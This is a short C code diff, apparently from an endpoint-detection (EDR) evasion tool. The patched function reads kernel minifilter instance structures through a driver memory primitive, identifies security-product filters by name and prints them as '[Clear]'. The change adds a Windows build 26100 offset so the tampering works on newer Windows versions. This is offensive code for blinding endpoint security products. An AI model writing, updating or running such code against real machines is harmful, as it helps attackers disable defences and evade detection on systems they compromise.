@@ -58,7 +58,7 @@ BOOL IsEDRIntance(INT j, INT64 Flink) {
 	INT64 FilterAddr = 0;
 	INT64 InstanceAddr = 0;
 	DWORD dwMajor = GetNtVersion();
-
+	DWORD dwbuild = GetNtBuild();
 	// Read instance address
 	DriverMemoryOperation((VOID*)Flink, &InstanceAddr, 8, MEMORY_WRITE);
 
@@ -74,7 +74,10 @@ BOOL IsEDRIntance(INT j, INT64 Flink) {
 	}
 
 	// Adjust offset based on Windows version
-	if (dwMajor == 10) {
+	if (dwMajor == 10 && dwbuild == 26100) {
+		InstanceAddr += 0x48;
+	}
+	else if (dwMajor == 10) {
 		InstanceAddr += 0x40;
 	}
 	else if (dwMajor == 6) {
@@ -88,7 +91,10 @@ BOOL IsEDRIntance(INT j, INT64 Flink) {
 	// Read filter address
 	DriverMemoryOperation((VOID*)InstanceAddr, &FilterAddr, 8, MEMORY_WRITE);
 	CHAR* FilterName = ReadDriverName(FilterAddr);
-	if (FilterName == NULL) return 0;
+	if (FilterName == NULL) {
+		
+		return 0;
+	}
 	PRINT("\t\t[%d] %s : %I64x [Clear]\n", j, FilterName, Flink - 0x10);
 
 	return Flag;
